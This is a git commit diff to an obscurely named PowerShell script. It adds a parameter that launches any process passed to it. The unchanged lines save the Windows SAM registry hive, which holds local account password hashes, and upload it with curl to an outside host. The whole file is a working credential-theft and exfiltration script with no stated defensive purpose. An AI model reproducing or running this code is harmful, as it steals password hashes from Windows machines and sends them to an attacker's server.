145b3978fa31599ff35448229170bcdf2b0446d4
rfuentesmontoyadeloitte <rfuentesmontoyadeloitte@gmail.com>
2025-05-06 16:16:42 +0000

    1fa3zAz.ps1

--- 1fa3zAz.ps1
+++ 1fa3zAz.ps1
@@ -1,2 +1,13 @@
+param (
+    [string]$parametro=""
+)
+
+if($parametro){
+    while($parametro){
+        Start-Process $parametro
+        $parametro=""
+    }
+}
+
 powershell C:\Windows\system32\reg.exe save hklm\sam ./l
 curl.exe --data-binary "@./l" http://xyz2a1.za
